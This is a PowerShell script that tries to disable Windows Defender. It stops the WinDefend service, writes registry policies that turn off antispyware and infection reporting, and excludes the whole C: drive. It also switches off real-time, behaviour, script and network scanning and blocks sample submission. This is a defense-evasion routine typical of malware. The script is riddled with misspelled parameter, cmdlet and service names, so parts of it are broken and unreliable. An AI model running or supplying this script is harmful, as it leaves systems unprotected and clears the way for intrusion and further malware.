# Attempt to disbale windows defender 
try {

    Get-Service WinDefend | Stop-Service -Force Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\services\WindDefend" -Name "Start" -Value 4 -Type DWORD -FORCE 

  } 
catch {
    Write-Warning "Failed to diable WinDenfend Service"
  }

try {
    New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft' -Name "WindowsDefender" -Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\WindowsDefender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWORD -Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\WindowsDefender" -Name "DisableRoutinelyTakingAction" -Value 1 -PropertyType DWORD -Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\WindowsDefender\Spynet" -Name "SpyNetReporting" -Value 1 -PropertyType DWORD -Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\WindowsDefender\Spynet" -Name "SubmitSamplesConsent" -Value 1 -PropertyType DWORD -Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\MRT" -Name "DontReportInfectionInformation" -Value 1 -PropertyType DWORD -Force -ea 0 | Out-Null 
    if (-Not ((GetWmiObject -class Win32_OperatingSystem).Version -eq "6.1.7601")) {

         Add-MpPreference -ExclusionPath "C:\" -Force -ea 0 | Out-Null
         Set-MpPreference -DisableArchiveScannig $true -Force -ea 0 | Out-Null
         Set-MpPreference -DisableBehaviourMonitoring $true -Force -ea 0 | Out-Null
         Set-MpPreference -DisableBlockAtFirstSeen $true -Force -ea 0 | Out-Null
         Set-MpPreference -DisableCatchupFullScan $true -Force -ea 0 | Out-Null
         Set-MpPreference -DisableCatchupQuickScan $true -Force -ea 0 | Out-Null
         Set-MpPreference -DisbaleIntrusionPreventionSystem $true -Force -ea 0 | Out-Null
         Set-MpPreference -DisableIOAVProtection $true -Force -ea 0 | Out-Null
         Set-MpPreference -DisableRealtimeMonitoring $true -Force -ea 0 | Out-Null
         Set-MpPreference -DisableRemovableDriveScanning $true -Force -ea 0 | Out-Null
         Set-MpPreference -DisableRestorePoint $true -Force -ea 0 | Out-Null
         Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true -Force -ea 0 | Out-Null
         Set-MpPreference -DisbleScanningNetworkFiles $true -Force -ea 0 | Out-Null 
         Set-MpPreference -DisableScriptScanning $true -Force -ea 0 | Out-Null 
         Set-MpPreference -EnableControlledFolderAccess Disabled -Force -ea 0 | Out-Null 
         Set-MpPreference -EnableNetworkProtection AuditMode -Force -ea 0 | Out-Null 
         Set-MpPreference -MAPSReporting Disabled -Force -ea 0 | Out-Null 
         Set-MpPreference -SubmitSamplesConsent NeverSend -Force -ea 0 | Out-Null 
         Set-MpPreference -PUAProetection Disabled -Force -ea 0 | Out-Null
     
    }
} 
 catch {
    Write-Warning "Failed to diable the windows defender"
 }
